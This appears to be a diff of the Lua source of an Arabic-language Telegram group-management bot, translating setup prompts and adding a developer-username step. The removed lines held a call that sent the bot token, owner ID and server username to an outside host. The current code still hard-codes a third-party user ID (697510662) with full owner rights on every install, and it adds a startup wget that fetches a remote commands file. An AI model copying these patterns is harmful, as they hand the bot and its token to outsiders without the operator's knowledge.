@@ -21,49 +21,59 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n »» Send Your Token Bot :\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[1;31m»» Sorry The Token is not Correct ')
+print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;32m »» The Token Is Saved\n27[0;39;49m')
+io.write('\27[1;35m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(id_server..":token",token)
 end 
 else
-print('\27[1;31m»»The Token was not Saved')
+print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
-os.execute('lua  MERO.lua')
+os.execute('lua MERO.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;31m\n »» Send Your Id Sudo : \n\27[0;33;49m')
+io.write('\27[0;31m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
-io.write('\27[0;32m »» The Id Is Saved \n27[0;39;49m')
+io.write('\27[0;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
-os.execute('lua  MERO.lua')
+os.execute('lua MERO.lua')
+end
+if not database:get(id_server..":SUDO:USERNAME") then
+io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[0;39;49m')
+local SUDOUSERNAME = io.read():gsub('@','')
+if SUDOUSERNAME ~= '' then
+io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
+database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
+else
+print('\n\27[1;34m لم يتم حفظ معرف المطور :')
+end 
+os.execute('lua MERO.lua')
 end
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://hso.mohammed-api.com/api/API MERO.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
-print('\n\27[1;34m Hi Welcome To Source Boyka X ')
-file = io.open(" MERO", "w")  
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
+file = io.open("MERO", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/ MERO
+cd $HOME/MERO
 token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
@@ -83,18 +93,18 @@ echo -e "\033[38;5;208m"
 echo -e "                                                  "
 echo -e "\033[0;00m"
 echo -e "\e[36m"
-./tg -s ./ MERO.lua -p PROFILE --bot=$token
+./tg -s ./MERO.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
-file = io.open(" run", "w")  
+file = io.open("run", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/ MERO
+cd $HOME/MERO
 while(true) do
 rm -fr ../.telegram-cli
-screen -S  MERO -X kill
-screen -S  MERO ./ MERO
+screen -S MERO -X kill
+screen -S MERO ./MERO
 done
 ]])  
 file:close() 
@@ -125,20 +135,12 @@ return config
 end 
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
-print("\27[0;33m"..[[
-
-┏┓━━━━━━━━━━━┏┓━━━━━━━━━━━
-┃┃━━━━━━━━━━━┃┃━━━━━━━━━━━
-┃┗━┓┏━━┓┏┓━┏┓┃┃┏┓┏━━┓━┏┓┏┓
-┃┏┓┃┃┏┓┃┃┃━┃┃┃┗┛┛┗━┓┃━┗╋╋┛
-┃┗┛┃┃┗┛┃┃┗━┛┃┃┏┓┓┃┗┛┗┓┏╋╋┓
-┗━━┛┗━━┛┗━┓┏┛┗┛┗┛┗━━━┛┗┛┗┛
-━━━━━━━━┏━┛┃━━━━━━━━━━━━━━
-━━━━━━━━┗━━┛━━━━━━━━━━━━━━
+print([[
 
 > CH › @MERO170
+> CH › @MERO170
 ~> DEVELOPER › @FEEEM
-]].."\n\027[00m")
+]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
@@ -146,30 +148,33 @@ bot_id = sudos.token:match("(%d+)")
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
+io.popen("mkdir File_Bot") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MEROBOOT/Files_MERO/master/File_Bot/commands.lua") 
+t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
+i = 0
+for v in io.popen('ls File_Bot'):lines() do
+if v:match(".lua$") then
+i = i + 1
+t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
+end
+end
+print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,697510662}   
+sudo_users = {SUDO,697510662}
 function SudoBot(msg)  
-local  MERO = false  
+local MERO = false  
 for k,v in pairs(sudo_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
- MERO = true  
+MERO = true  
 end  
 end  
-return  MERO  
+return MERO  
 end 
 function Sudo(msg) 
 local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
-return true  
-else  
-return false  
-end  
-end
-function Mamez(msg) 
-local hash = database:sismember(bot_id..'Mamez:User', msg.sender_user_id_) 
-if hash or SudoBot(msg) or Sudo(msg) then  
 return true  
 else  
 return false  
@@ -218,7 +223,7 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(697510662) then  
 var = true  
-elseif tonumber(user_id) == tonumber(SUDO) then  
+elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
 var = true  
@@ -232,8 +237,6 @@ elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
 var = true  
 elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
 var = true  
-elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
-var = true 
 else  
 var = false  
 end  
@@ -9064,7 +9067,7 @@ database:set(bot_id.."Games:Bat"..msg.chat_id_,Num)
 TEST = [[
 ┆في اي يد يقع المحبس   ܰ
 ━━━ ━━━━━━━━━ ━━━━━
-٭ 👊🏻6 ٭ 👊🏻5 ٭ 👊🏻4 ٭ 👊🏻3 ٭ 👊🏻2 ٭ 👊🏻1 ٭
+٭ ??🏻6 ٭ 👊🏻5 ٭ 👊🏻4 ٭ 👊🏻3 ٭ 👊🏻2 ٭ 👊🏻1 ٭
 ━━━ ━━━━━━━━ ━━━━━━
 ┆اختار رقم لاستخراج المحبس  من اليد الذي تحمل المحبس
 ┆الفائز يحصل على  ◃ 5 ▹ نقاط
